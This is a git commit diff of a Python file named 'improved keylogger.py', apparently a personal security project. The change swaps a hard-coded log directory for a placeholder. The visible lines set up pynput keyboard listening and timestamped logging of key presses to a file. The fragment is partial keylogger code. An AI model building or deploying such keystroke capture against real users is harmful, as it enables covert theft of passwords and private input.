0bfadce95054b8eca48fceb75eebc39b55863a0b
t <tsc405@gmail.com>
2023-06-02 23:10:38 -0400

    Update improved keylogger.py

--- improved keylogger.py
+++ improved keylogger.py
@@ -2,7 +2,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:\securityProjects\python\improved keylogger"
+log_dir = r"FILEPATH HERE"
 logging.basicConfig(filename = (log_dir + r"/log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s')
 
 def on_press(key):
